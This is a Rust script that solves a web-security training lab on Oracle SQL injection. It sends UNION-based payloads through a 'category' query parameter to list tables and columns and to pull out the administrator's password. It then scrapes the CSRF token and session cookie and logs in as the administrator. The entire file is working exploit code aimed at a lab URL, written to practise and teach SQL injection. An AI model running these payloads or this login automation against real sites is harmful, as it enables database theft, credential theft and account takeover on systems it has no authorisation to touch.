/***************************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 16/9/2023
*
* Lab: SQL injection attack, listing the database contents on Oracle
*
* Steps: 1. Inject payload into 'category' query parameter to retrieve the name of
*           users table
*        2. Adjust the payload to retrieve the names of username and password columns
*        3. Adjust the payload to retrieve the administrator password
*        4. Fetch the login page
*        5. Extract csrf token and session cookie
*        6. Login as the administrator
*        7. Fetch the administrator profile
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a17002c048a8b68930a9d50002e0069.web-security-academy.net";
    // build the client used in all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "[#] Injection parameter:".blue(),
        "category".yellow()
    );
    print!(
        "{}",
        "1. Injecting a payload to retrieve the name of users table.. ".white(),
    );
    io::stdout().flush();
    // payload to retreive the name of users table
    let users_table_payload = "' union SELECT table_name, null from all_tables-- -";
    // fetch the page with the injected payload
    let users_table_injection = client
        .get(format!("{url}/filter?category={users_table_payload}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload to retreive the name of users table"
                .red()
        ));
    let mut body = users_table_injection.text().unwrap();
    // extract the name of users table
    let users_table = capture_pattern("<th>(USERS_.*)</th>", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the name of users table".red()
    ));
    println!("{} => {}", "OK".green(), users_table.yellow());

    print!(
        "{}",
        "2. Adjusting the payload to retrieve the names of username and password columns.. "
            .white(),
    );
    io::stdout().flush();
    // payload to retreive the names of username and password columns
    let username_password_columns_payload = format!(
        "' union SELECT column_name, null from all_tab_columns where table_name = '{}'-- -",
        users_table
    );
    // fetch the page with the injected payload
    let username_password_columns_injection = client
        .get(format!(
            "{url}/filter?category={username_password_columns_payload}"
        ))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload to retreive the name of username and password columns".red()
        ));
    body = username_password_columns_injection.text().unwrap();
    // extract the name of username column
    let username_column = capture_pattern("<th>(USERNAME_.*)</th>", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the name of username column".red()
    ));
    // extract the name of password column
    let password_column = capture_pattern("<th>(PASSWORD_.*)</th>", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the name of password column".red()
    ));
    println!(
        "{} => {} | {}",
        "OK".green(),
        username_column.yellow(),
        password_column.yellow()
    );

    print!(
        "{}",
        "3. Adjusting the payload to retrieve the administrator password.. ".white(),
    );
    io::stdout().flush();
    // payload to retreive the password of the administrator
    let admin_password_payload = format!(
        "' union SELECT {}, {} from {} where {} = 'administrator'-- -",
        username_column, password_column, users_table, username_column
    );
    // fetch the page with the injected payload
    let admin_password_injection = client
        .get(format!(
            "{url}/filter?category={admin_password_payload}"
        ))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload to retreive the password of the administrator".red()
        ));
    body = admin_password_injection.text().unwrap();
    // extract the administrator password
    let admin_password = capture_pattern("<td>(.*)</td>", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the password of the administrator".red()
    ));
    println!("{} => {}", "OK".green(), admin_password.yellow(),);

    print!("{}", "4. Fetching login page.. ".white());
    io::stdout().flush();
    // fetch the login page
    let fetch_login = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch login page".red()));
    println!("{}", "OK".green());

    print!(
        "{}",
        "5. Extracting csrf token and session cookie.. ".white()
    );
    io::stdout().flush();
    // extract session cookie
    let session = extract_session_cookie(fetch_login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
    // extract csrf token
    let csrf =
        extract_csrf(fetch_login).expect(&format!("{}", "[!] Failed to extract csrf token".red()));
    println!("{}", "OK".green());

    print!("{}", "6. Logging in as the administrator.. ".white(),);
    io::stdout().flush();
    // login as the administrator
    let admin_login = client
        .post(format!("{url}/login"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("password", &admin_password),
            ("csrf", &csrf),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to login as the administrator".red()
        ));
    println!("{}", "OK".green());

    // extract the new session
    let new_session = extract_session_cookie(admin_login.headers()).expect(&format!(
        "{}",
        "[!] Failed to extract new session cookie".red()
    ));

    // fetch administrator page
    print!("{}", "7. Fetching the administrator profile.. ".white(),);
    io::stdout().flush();
    let admin = client
        .get(format!("{url}/my-account"))
        .header("Cookie", format!("session={new_session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch administrator profile".red()
        ));
    println!("{}", "OK".green());

    println!(
        "{} {}",
        "[#] Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}
